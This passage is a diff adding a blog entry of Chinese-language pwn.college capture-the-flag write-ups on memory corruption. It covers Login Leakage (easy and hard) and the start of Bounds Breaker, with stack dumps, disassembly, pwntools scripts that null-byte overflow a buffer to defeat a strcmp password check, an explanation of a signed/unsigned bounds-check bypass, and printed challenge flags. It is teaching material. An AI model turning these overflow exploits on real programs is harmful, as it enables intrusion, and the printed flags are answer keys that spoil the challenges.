@@ -9342,4 +9342,454 @@ from a browser blindly.</p>
         <tag>Security</tag>
       </tags>
   </entry>
+  <entry>
+    <title>PwnCollege - Program Security - Memory Corruption</title>
+    <url>/wp/PwnCollege/PwnCollege-ps-memory-corruption/</url>
+    <content><![CDATA[<h1 id="login-leakage-easy">Login Leakage (Easy)</h1>
+<blockquote>
+<p>Leverage memory corruption to satisfy a simple constraint</p>
+</blockquote>
+<h2 id="analysis">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hacker@program-security~login-leakage-easy:~$ /challenge/login-leakage-easy</span><br><span class="line">The challenge() <span class="keyword">function</span> has just been launched!</span><br><span class="line">Before we <span class="keyword">do</span> anything, <span class="built_in">let</span><span class="string">&#x27;s take a look at challenge()&#x27;</span>s stack frame:</span><br><span class="line">+---------------------------------+-------------------------+--------------------+</span><br><span class="line">|                  stack location |            Data (bytes) |      Data (LE int) |</span><br><span class="line">+---------------------------------+-------------------------+--------------------+</span><br><span class="line">| 0x00007ffca2408530 (RSP+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408538 (RSP+0x0008) | 98 98 40 a2 <span class="built_in">fc</span> 7f 00 00 | 0x00007ffca2409898 |</span><br><span class="line">| 0x00007ffca2408540 (RSP+0x0010) | 88 98 40 a2 <span class="built_in">fc</span> 7f 00 00 | 0x00007ffca2409888 |</span><br><span class="line">| 0x00007ffca2408548 (RSP+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |</span><br><span class="line">| 0x00007ffca2408550 (RSP+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408558 (RSP+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408560 (RSP+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408568 (RSP+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408570 (RSP+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408578 (RSP+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408580 (RSP+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408588 (RSP+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408590 (RSP+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408598 (RSP+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085a0 (RSP+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085a8 (RSP+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085b0 (RSP+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085b8 (RSP+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085c0 (RSP+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085c8 (RSP+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085d0 (RSP+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085d8 (RSP+0x00a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085e0 (RSP+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085e8 (RSP+0x00b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085f0 (RSP+0x00c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24085f8 (RSP+0x00c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408600 (RSP+0x00d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408608 (RSP+0x00d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408610 (RSP+0x00e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408618 (RSP+0x00e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408620 (RSP+0x00f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408628 (RSP+0x00f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408630 (RSP+0x0100) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408638 (RSP+0x0108) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408640 (RSP+0x0110) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408648 (RSP+0x0118) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408650 (RSP+0x0120) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408658 (RSP+0x0128) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408660 (RSP+0x0130) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408668 (RSP+0x0138) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408670 (RSP+0x0140) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408678 (RSP+0x0148) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408680 (RSP+0x0150) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408688 (RSP+0x0158) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408690 (RSP+0x0160) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408698 (RSP+0x0168) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086a0 (RSP+0x0170) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086a8 (RSP+0x0178) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086b0 (RSP+0x0180) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086b8 (RSP+0x0188) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086c0 (RSP+0x0190) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086c8 (RSP+0x0198) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086d0 (RSP+0x01a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086d8 (RSP+0x01a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086e0 (RSP+0x01b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086e8 (RSP+0x01b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086f0 (RSP+0x01c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca24086f8 (RSP+0x01c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408700 (RSP+0x01d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408708 (RSP+0x01d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408710 (RSP+0x01e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408718 (RSP+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408720 (RSP+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408728 (RSP+0x01f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408730 (RSP+0x0200) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408738 (RSP+0x0208) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffca2408740 (RSP+0x0210) | 00 00 00 00 00 00 25 0c | 0x0c25000000000000 |</span><br><span class="line">| 0x00007ffca2408748 (RSP+0x0218) | d5 3c 61 40 cb d1 00 00 | 0x0000d1cb40613cd5 |</span><br><span class="line">| 0x00007ffca2408750 (RSP+0x0220) | 00 82 64 58 27 60 00 00 | 0x0000602758648200 |</span><br><span class="line">| 0x00007ffca2408758 (RSP+0x0228) | 80 98 40 a2 03 00 00 00 | 0x00000003a2409880 |</span><br><span class="line">| 0x00007ffca2408760 (RSP+0x0230) | 90 97 40 a2 <span class="built_in">fc</span> 7f 00 00 | 0x00007ffca2409790 |</span><br><span class="line">| 0x00007ffca2408768 (RSP+0x0238) | c0 8c 64 58 27 60 00 00 | 0x0000602758648cc0 |</span><br><span class="line">+---------------------------------+-------------------------+--------------------+</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Input buffer</strong> 起始地址:
+<code>0x7ffca2408560</code></li>
+<li><strong>Password</strong> 起始地址: <code>0x7ffca2408746</code></li>
+<li><strong>Offset</strong>:
+<code>0x7ffca2408746 - 0x7ffca2408560 = 0x1E6</code> (486 bytes)</li>
+</ul>
+<p>先看距离，再看比较逻辑。<code>ltrace</code> 直接把关键点抖出来了:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strcmp</span>(<span class="string">&quot;123123\n&quot;</span>, <span class="string">&quot;n`\322\232\024\t[,&quot;</span>) = <span class="number">-61</span></span><br></pre></td></tr></table></figure>
+<p>程序直接调用标准库里的 <code>strcmp</code>
+来比较输入和随机生成的密码。<code>strcmp</code>
+比较字符串时，<strong>一遇到 null terminator (<code>\x00</code>)
+就会停止</strong>。</p>
+<p>既然题目不仅禁用了 canary (stack protector)，还允许你输入任意长度的
+payload，底层大概率就是 <code>read()</code> 这种可以读入
+<code>\x00</code> 的接口，而不是会截断的
+<code>scanf</code>。所以这里根本不用猜密码，直接用 <strong>null byte
+injection</strong> (空字节注入) 让判断逻辑失效就行。</p>
+<ol type="1">
+<li>如果我们在 <code>input</code> 的第一个字节就写入
+<code>\x00</code>，<code>strcmp</code> 就会认为我们的输入是一个空字符串
+<code>""</code>。</li>
+<li>因为存在 buffer overflow，我们可以一路把 <code>\x00</code>
+填充过去，跨越那 486 bytes 的距离，顺便把目标 <code>password</code>
+的第一个字节也覆盖成 <code>\x00</code>。</li>
+<li>这样一来，<code>password</code> 在 <code>strcmp</code>
+眼里也变成了空字符串 <code>""</code>。</li>
+</ol>
+<p><strong><code>strcmp("", "") == 0</code>，密码校验直接
+pass。</strong></p>
+<h2 id="exploit">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/login-leakage-easy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 486 bytes 的 \x00 用来填满 buffer，同时让 input 变成空字符串 &quot;&quot;</span></span><br><span class="line"><span class="comment"># 第 487 个 byte 的 \x00 用来精准覆盖 password 的第一个字节，让它也变成 &quot;&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">487</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{wthFhdGjaeJBEazRhx2KFtz8tF5.QXwgzN4EDL4cjM1gzW}</span></span>
+<h1 id="login-leakage-hard">Login Leakage (Hard)</h1>
+<blockquote>
+<p>Leverage memory corruption to satisfy a simple constraint</p>
+</blockquote>
+<h2 id="analysis-1">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/login-leakage-hard</span><br><span class="line">            ; CALL XREF from main @ 0x16ff(x)</span><br><span class="line">┌ 396: sym.challenge (int64_t arg1, int64_t arg2, int64_t arg3);</span><br><span class="line">│ `- args(RDI, RSI, RDX) vars(7:sp[0xc..0x1e0])</span><br><span class="line">│           0x000014f2      f30f1efa       endbr64</span><br><span class="line">│           0x000014f6      55             push RBP</span><br><span class="line">│           0x000014f7      4889e5         mov RBP, RSP</span><br><span class="line">│           0x000014fa      4881ece001..   sub RSP, 0x1e0</span><br><span class="line">│           0x00001501      89bd3cfeffff   mov dword [var_1c4h], edi   ; arg1</span><br><span class="line">│           0x00001507      4889b530fe..   mov qword [var_1d0h], RSI   ; arg2</span><br><span class="line">│           0x0000150e      48899528fe..   mov qword [var_1d8h], RDX   ; arg3</span><br><span class="line">│           0x00001515      488d9550fe..   lea RDX, [path]</span><br><span class="line">│           0x0000151c      b800000000     mov eax, 0</span><br><span class="line">│           0x00001521      b933000000     mov ecx, 0x33               ; <span class="string">&#x27;3&#x27;</span></span><br><span class="line">│           0x00001526      4889d7         mov RDI, RDX</span><br><span class="line">│           0x00001529      f348ab         rep stosq qword [RDI], RAX</span><br><span class="line">│           0x0000152c      4889fa         mov RDX, RDI</span><br><span class="line">│           0x0000152f      668902         mov word [RDX], ax</span><br><span class="line">│           0x00001532      4883c202       add RDX, 2</span><br><span class="line">│           0x00001536      be00000000     mov esi, 0                  ; int oflag</span><br><span class="line">│           0x0000153b      488d3dca0b..   lea RDI, str._dev_urandom   ; 0x210c ; <span class="string">&quot;/dev/urandom&quot;</span> ; const char *path</span><br><span class="line">│           0x00001542      b800000000     mov eax, 0</span><br><span class="line">│           0x00001547      e854fcffff     call sym.imp.open           ; int open(const char *path, int oflag)</span><br><span class="line">│           0x0000154c      8945fc         mov dword [fildes], eax</span><br><span class="line">│           0x0000154f      488d8550fe..   lea RAX, [path]</span><br><span class="line">│           0x00001556      488d889201..   lea RCX, [RAX + 0x192]</span><br><span class="line">│           0x0000155d      8b45fc         mov eax, dword [fildes]</span><br><span class="line">│           0x00001560      ba08000000     mov edx, 8                  ; size_t nbyte</span><br><span class="line">│           0x00001565      4889ce         mov RSI, RCX                ; void *buf</span><br><span class="line">│           0x00001568      89c7           mov edi, eax                ; int fildes</span><br><span class="line">│           0x0000156a      e801fcffff     call sym.imp.read           ; ssize_t <span class="built_in">read</span>(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x0000156f      8b45fc         mov eax, dword [fildes]</span><br><span class="line">│           0x00001572      89c7           mov edi, eax                ; int fildes</span><br><span class="line">│           0x00001574      e8e7fbffff     call sym.imp.close          ; int close(int fildes)</span><br><span class="line">│           0x00001579      48c78548fe..   mov qword [nbyte], 0</span><br><span class="line">│           0x00001584      488d3d8e0b..   lea RDI, str.Payload_size:  ; 0x2119 ; <span class="string">&quot;Payload size: &quot;</span> ; const char *format</span><br><span class="line">│           0x0000158b      b800000000     mov eax, 0</span><br><span class="line">│           0x00001590      e8abfbffff     call sym.imp.printf         ; int <span class="built_in">printf</span>(const char *format)</span><br><span class="line">│           0x00001595      488d8548fe..   lea RAX, [nbyte]</span><br><span class="line">│           0x0000159c      4889c6         mov RSI, RAX</span><br><span class="line">│           0x0000159f      488d3d820b..   lea RDI, [0x00002128]       ; <span class="string">&quot;%lu&quot;</span> ; const char *format</span><br><span class="line">│           0x000015a6      b800000000     mov eax, 0</span><br><span class="line">│           0x000015ab      e800fcffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)</span><br><span class="line">│           0x000015b0      488b8548fe..   mov RAX, qword [nbyte]</span><br><span class="line">│           0x000015b7      4889c6         mov RSI, RAX</span><br><span class="line">│           0x000015ba      488d3d6f0b..   lea RDI, str.Send_your_payload__up_to__lu_bytes___n ; 0x2130 ; <span class="string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span> ; const char *format</span><br><span class="line">│           0x000015c1      b800000000     mov eax, 0</span><br><span class="line">│           0x000015c6      e875fbffff     call sym.imp.printf         ; int <span class="built_in">printf</span>(const char *format)</span><br><span class="line">│           0x000015cb      488b9548fe..   mov RDX, qword [nbyte]      ; size_t nbyte</span><br><span class="line">│           0x000015d2      488d8550fe..   lea RAX, [path]</span><br><span class="line">│           0x000015d9      4889c6         mov RSI, RAX                ; void *buf</span><br><span class="line">│           0x000015dc      bf00000000     mov edi, 0                  ; int fildes</span><br><span class="line">│           0x000015e1      e88afbffff     call sym.imp.read           ; ssize_t <span class="built_in">read</span>(int fildes, void *buf, size_t nbyte)</span><br><span class="line">│           0x000015e6      8945f8         mov dword [var_8h], eax</span><br><span class="line">│           0x000015e9      837df800       cmp dword [var_8h], 0</span><br><span class="line">│       ┌─&lt; 0x000015ed      792c           jns 0x161b</span><br><span class="line">│       │   0x000015ef      e81cfbffff     call sym.imp.__errno_location</span><br><span class="line">│       │   0x000015f4      8b00           mov eax, dword [RAX]</span><br><span class="line">│       │   0x000015f6      89c7           mov edi, eax                ; int errnum</span><br><span class="line">│       │   0x000015f8      e8d3fbffff     call sym.imp.strerror       ; char *strerror(int errnum)</span><br><span class="line">│       │   0x000015fd      4889c6         mov RSI, RAX</span><br><span class="line">│       │   0x00001600      488d3d510b..   lea RDI, str.ERROR:_Failed_to_read_input_____s__n ; 0x2158 ; <span class="string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span> ; const char *format</span><br><span class="line">│       │   0x00001607      b800000000     mov eax, 0</span><br><span class="line">│       │   0x0000160c      e82ffbffff     call sym.imp.printf         ; int <span class="built_in">printf</span>(const char *format)</span><br><span class="line">│       │   0x00001611      bf01000000     mov edi, 1                  ; int status</span><br><span class="line">│       │   0x00001616      e8a5fbffff     call sym.imp.exit           ; void <span class="built_in">exit</span>(int status)</span><br><span class="line">│       │   ; CODE XREF from sym.challenge @ 0x15ed(x)</span><br><span class="line">│       └─&gt; 0x0000161b      488d8550fe..   lea RAX, [path]</span><br><span class="line">│           0x00001622      488d909201..   lea RDX, [RAX + 0x192]</span><br><span class="line">│           0x00001629      488d8550fe..   lea RAX, [path]</span><br><span class="line">│           0x00001630      4889d6         mov RSI, RDX                ; const char *s2</span><br><span class="line">│           0x00001633      4889c7         mov RDI, RAX                ; const char *s1</span><br><span class="line">│           0x00001636      e845fbffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)</span><br><span class="line">│           0x0000163b      85c0           <span class="built_in">test</span> eax, eax</span><br><span class="line">│       ┌─&lt; 0x0000163d      7416           je 0x1655</span><br><span class="line">│       │   0x0000163f      488d3d3a0b..   lea RDI, str.Password_check_failed__Exiting_ ; 0x2180 ; <span class="string">&quot;Password check failed! Exiting!&quot;</span> ; const char *s</span><br><span class="line">│       │   0x00001646      e8d5faffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│       │   0x0000164b      bf01000000     mov edi, 1                  ; int status</span><br><span class="line">│       │   0x00001650      e86bfbffff     call sym.imp.exit           ; void <span class="built_in">exit</span>(int status)</span><br><span class="line">│       │   ; CODE XREF from sym.challenge @ 0x163d(x)</span><br><span class="line">│       └─&gt; 0x00001655      488d3d440b..   lea RDI, str.Password_check_passed_ ; 0x21a0 ; <span class="string">&quot;Password check passed!&quot;</span> ; const char *s</span><br><span class="line">│           0x0000165c      e8bffaffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00001661      b800000000     mov eax, 0</span><br><span class="line">│           0x00001666      e880fdffff     call sym.win</span><br><span class="line">│           0x0000166b      488d3d450b..   lea RDI, str.Goodbye_       ; 0x21b7 ; <span class="string">&quot;Goodbye!&quot;</span> ; const char *s</span><br><span class="line">│           0x00001672      e8a9faffff     call sym.imp.puts           ; int puts(const char *s)</span><br><span class="line">│           0x00001677      b800000000     mov eax, 0</span><br><span class="line">│           0x0000167c      c9             leave</span><br><span class="line">└           0x0000167d      c3             ret</span><br></pre></td></tr></table></figure>
+<p>这一题和 Easy 本质一样，还是利用 <code>strcmp</code>
+的字符串终止规则，只是需要先从反汇编里把布局自己抠出来。</p>
+<ol type="1">
+<li><strong>随机密码生成逻辑 (0x154f - 0x156a):</strong>
+<ul>
+<li><code>lea RAX, [path]</code>：加载 <code>path</code>
+缓冲区的基地址。</li>
+<li><code>lea RCX, [RAX + 0x192]</code>：计算出目标地址
+<code>path + 0x192</code>。</li>
+<li><code>call sym.imp.read</code>：从 <code>/dev/urandom</code> 读取 8
+bytes 写入到 <code>path + 0x192</code>。</li>
+<li><strong>结论</strong>：真正的密码存放位置是相对于你输入缓冲区的偏移量
+<code>0x192</code> 处。</li>
+</ul></li>
+<li><strong>输入控制权交接 (0x159f - 0x15ab):</strong>
+<ul>
+<li>程序用 <code>scanf("%lu")</code> 让你自己输入后续要读取的
+<code>Payload size</code> (<code>nbyte</code>)。没有做任何边界检查
+(bounds checking)，很典型的代码。</li>
+</ul></li>
+<li><strong>buffer overflow 发生地 (0x15d2 - 0x15e1):</strong>
+<ul>
+<li><code>mov RSI, RAX</code> (其中 RAX 是 <code>path</code>
+的地址)</li>
+<li><code>call sym.imp.read</code>：从标准输入 (<code>fd=0</code>)
+读取你指定长度 (<code>nbyte</code>) 的数据，直接怼进 <code>path</code>
+的头部。</li>
+</ul></li>
+<li><strong>致命的比较 (0x161b - 0x1636):</strong>
+<ul>
+<li><code>mov RDI, RAX</code> (<code>s1</code> = <code>path</code>)</li>
+<li><code>mov RSI, RDX</code> (<code>s2</code> =
+<code>path + 0x192</code>)</li>
+<li><code>call sym.imp.strcmp</code>：程序居然又用了
+<code>strcmp</code>！</li>
+</ul></li>
+</ol>
+<p>利用思路:</p>
+<ol type="1">
+<li>计算偏移：<code>0x192</code> 转换为十进制就是 <strong>402</strong>
+bytes。</li>
+<li>利用不受限制的 <code>read</code>，往缓冲区塞满
+<code>\x00</code>。</li>
+<li>第 1 个 <code>\x00</code> 会让 <code>path</code> (你的输入) 被
+<code>strcmp</code> 视为空字符串 <code>""</code>。</li>
+<li>第 403 个 <code>\x00</code> 会精准覆盖掉 <code>path + 0x192</code>
+(随机密码) 的第一个字节，让密码也被视为空字符串 <code>""</code>。</li>
+</ol>
+<h2 id="exploit-1">Exploit</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/login-leakage-hard&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x192 = 402 (十进制)</span></span><br><span class="line"><span class="comment"># 我们需要 402 个 \x00 来填充直到密码所在的位置</span></span><br><span class="line"><span class="comment"># 第 403 个 \x00 覆盖密码的第一个字节</span></span><br><span class="line">offset = <span class="number">403</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * offset</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(offset).encode())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">pwn.college{EziJep0N4Bnd83ahmJdcZ2XvWHL.QXxgzN4EDL4cjM1gzW}</span></span>
+<h1 id="bounds-breaker-easy">Bounds Breaker (Easy)</h1>
+<blockquote>
+<p>Overflow a buffer and smash the stack to obtain the flag, but this
+time bypass a check designed to prevent you from doing so!</p>
+</blockquote>
+<h2 id="analysis-2">Analysis</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hacker@program-security~bounds-breaker-easy:~$ /challenge/bounds-breaker-easy</span><br><span class="line">The challenge() <span class="keyword">function</span> has just been launched!</span><br><span class="line">Before we <span class="keyword">do</span> anything, <span class="built_in">let</span><span class="string">&#x27;s take a look at challenge()&#x27;</span>s stack frame:</span><br><span class="line">+---------------------------------+-------------------------+--------------------+</span><br><span class="line">|                  stack location |            Data (bytes) |      Data (LE int) |</span><br><span class="line">+---------------------------------+-------------------------+--------------------+</span><br><span class="line">| 0x00007ffea42aa180 (RSP+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |</span><br><span class="line">| 0x00007ffea42aa188 (RSP+0x0008) | 38 b3 2a a4 fe 7f 00 00 | 0x00007ffea42ab338 |</span><br><span class="line">| 0x00007ffea42aa190 (RSP+0x0010) | 28 b3 2a a4 fe 7f 00 00 | 0x00007ffea42ab328 |</span><br><span class="line">| 0x00007ffea42aa198 (RSP+0x0018) | 20 60 40 00 01 00 00 00 | 0x0000000100406020 |</span><br><span class="line">| 0x00007ffea42aa1a0 (RSP+0x0020) | 40 15 f0 00 b4 7c 00 00 | 0x00007cb400f01540 |</span><br><span class="line">| 0x00007ffea42aa1a8 (RSP+0x0028) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffea42aa1b0 (RSP+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffea42aa1b8 (RSP+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffea42aa1c0 (RSP+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffea42aa1c8 (RSP+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffea42aa1d0 (RSP+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffea42aa1d8 (RSP+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffea42aa1e0 (RSP+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffea42aa1e8 (RSP+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |</span><br><span class="line">| 0x00007ffea42aa1f0 (RSP+0x0070) | 30 b2 2a a4 fe 7f 00 00 | 0x00007ffea42ab230 |</span><br><span class="line">| 0x00007ffea42aa1f8 (RSP+0x0078) | b0 a1 2a a4 fe 7f 00 00 | 0x00007ffea42aa1b0 |</span><br><span class="line">| 0x00007ffea42aa200 (RSP+0x0080) | 30 b2 2a a4 fe 7f 00 00 | 0x00007ffea42ab230 |</span><br><span class="line">| 0x00007ffea42aa208 (RSP+0x0088) | 2a 21 40 00 00 00 00 00 | 0x000000000040212a |</span><br><span class="line">+---------------------------------+-------------------------+--------------------+</span><br><span class="line">Our stack pointer points to 0x7ffea42aa180, and our base pointer points to 0x7ffea42aa200.</span><br><span class="line">The input buffer begins at 0x7ffea42aa1b0.</span><br><span class="line">The <span class="built_in">return</span> address is stored at 0x7ffea42aa208, 88 bytes after the start of your input buffer.</span><br></pre></td></tr></table></figure>
+<ul>
+<li>buffer address: <code>0x7ffea42aa1b0</code></li>
+<li>return address: <code>0x7ffea42aa208</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hacker@program-security~bounds-breaker-easy:~$ nm /challenge/bounds-breaker-easy | grep win</span><br><span class="line">000000000040198c T win</span><br></pre></td></tr></table></figure>
+<p><code>win</code> -&gt; <code>0x40198c</code></p>
+<p>这里真正要打的不是覆盖本身，而是 <strong>signed / unsigned
+conversion</strong>。</p>
+<p>The standard C library uses unsigned integers for sizes, for example
+the last argument to <code>read</code>, <code>memcmp</code>,
+<code>strncpy</code>, and friends. By contrast, the default integer
+types like <code>short</code>, <code>int</code>, and <code>long</code>
+are signed.</p>
+<p>换句话说，这题的真正切入点是：<strong>检查发生在 signed
+world，危险调用发生在 unsigned
+world</strong>。一旦这两个世界之间发生类型转换，检查就失效了。</p>
+<p><strong>安全检查 (bounds check)</strong>: 程序执行判断
+<code>if (size &gt; 63) &#123; exit(); &#125;</code>。 <strong>底层调用</strong>:
+绕过检查后，程序会调用底层系统调用，比如
+<code>read(0, buffer, size)</code>。<code>read</code> 的第三个参数类型是
+<code>size_t</code> (unsigned)。</p>
+<p>当你输入 <code>-1</code> 时，有符号的安全检查会认为
+<code>-1 &lt; 63</code>，合法直接放行。但当 <code>-1</code> 被传递给
